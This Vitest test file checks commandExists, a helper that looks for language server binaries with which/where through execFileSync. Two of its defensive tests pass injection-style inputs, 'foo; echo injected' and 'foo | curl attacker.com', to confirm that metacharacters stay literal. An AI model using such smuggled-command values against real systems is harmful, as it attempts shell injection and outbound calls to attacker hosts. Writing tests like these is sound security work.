import { describe, it, expect, vi, beforeEach } from 'vitest';

// Mock child_process before importing the module under test
vi.mock('child_process', () => ({
  execFileSync: vi.fn(),
}));

import { execFileSync } from 'child_process';
import { commandExists } from '../servers.js';

const mockExecFileSync = vi.mocked(execFileSync);

describe('commandExists', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // TC-01: Normal path — Linux/macOS command exists
  it('TC-01: returns true on Linux when command exists', () => {
    vi.stubGlobal('process', { ...process, platform: 'linux' });
    mockExecFileSync.mockReturnValue(Buffer.from(''));

    const result = commandExists('typescript-language-server');

    expect(result).toBe(true);
    expect(mockExecFileSync).toHaveBeenCalledWith(
      'which',
      ['typescript-language-server'],
      { stdio: 'ignore' }
    );
    // Ensure first arg is just 'which', not 'which typescript-language-server'
    const [firstArg, secondArg] = mockExecFileSync.mock.calls[0];
    expect(firstArg).toBe('which');
    expect(secondArg).toEqual(['typescript-language-server']);
  });

  // TC-02: Normal path — Windows command exists
  it('TC-02: returns true on Windows when command exists', () => {
    vi.stubGlobal('process', { ...process, platform: 'win32' });
    mockExecFileSync.mockReturnValue(Buffer.from(''));

    const result = commandExists('typescript-language-server');

    expect(result).toBe(true);
    expect(mockExecFileSync).toHaveBeenCalledWith(
      'where',
      ['typescript-language-server'],
      { stdio: 'ignore' }
    );
    const [firstArg, secondArg] = mockExecFileSync.mock.calls[0];
    expect(firstArg).toBe('where');
    expect(secondArg).toEqual(['typescript-language-server']);
  });

  // TC-03: Command not found
  it('TC-03: returns false when command does not exist', () => {
    vi.stubGlobal('process', { ...process, platform: 'linux' });
    mockExecFileSync.mockImplementation(() => {
      throw new Error('not found');
    });

    const result = commandExists('nonexistent-lsp');

    expect(result).toBe(false);
    // Must not throw
  });

  // TC-04: Edge case — empty string
  it('TC-04: returns false and does not call execFileSync for empty string', () => {
    const result = commandExists('');

    expect(result).toBe(false);
    expect(mockExecFileSync).not.toHaveBeenCalled();
  });

  // TC-05: Edge case — command with shell metacharacters (injection attempt)
  it('TC-05: shell metacharacters are not expanded — treated as literal string', () => {
    vi.stubGlobal('process', { ...process, platform: 'linux' });
    mockExecFileSync.mockImplementation(() => {
      throw new Error('not found');
    });

    const result = commandExists('foo; echo injected');

    expect(result).toBe(false);
    // execFileSync is called with the full literal string as a single array element
    expect(mockExecFileSync).toHaveBeenCalledWith(
      'which',
      ['foo; echo injected'],
      { stdio: 'ignore' }
    );
    // The second argument is an array, not a concatenated shell string
    const argsArray = mockExecFileSync.mock.calls[0][1];
    expect(Array.isArray(argsArray)).toBe(true);
    expect(argsArray!).toHaveLength(1);
    expect(argsArray![0]).toBe('foo; echo injected');
  });

  // TC-06: Edge case — whitespace-only string
  it('TC-06: returns false and does not call execFileSync for whitespace-only string', () => {
    const result = commandExists('   ');

    expect(result).toBe(false);
    expect(mockExecFileSync).not.toHaveBeenCalled();
  });

  // TC-07: Regression — getAllServers call chain
  it('TC-07: getAllServers marks installed=true only for existing commands', async () => {
    vi.stubGlobal('process', { ...process, platform: 'linux' });
    // Only 'typescript-language-server' succeeds
    mockExecFileSync.mockImplementation((_cmd: string, args?: readonly string[]) => {
      if (args && args[0] === 'typescript-language-server') {
        return Buffer.from('/usr/local/bin/typescript-language-server');
      }
      throw new Error('not found');
    });

    const { getAllServers } = await import('../servers.js');
    const servers = getAllServers();

    const tsEntry = servers.find(s => s.command === 'typescript-language-server');
    expect(tsEntry).toBeDefined();
    expect(tsEntry!.installed).toBe(true);

    const otherEntries = servers.filter(s => s.command !== 'typescript-language-server');
    expect(otherEntries.every(s => s.installed === false)).toBe(true);

    // No exception thrown
  });

  // Additional: pipe character injection
  it('pipe metacharacter is treated as literal argument', () => {
    vi.stubGlobal('process', { ...process, platform: 'linux' });
    mockExecFileSync.mockImplementation(() => {
      throw new Error('not found');
    });

    const result = commandExists('foo | curl attacker.com');

    expect(result).toBe(false);
    expect(mockExecFileSync).toHaveBeenCalledWith(
      'which',
      ['foo | curl attacker.com'],
      { stdio: 'ignore' }
    );
  });
});
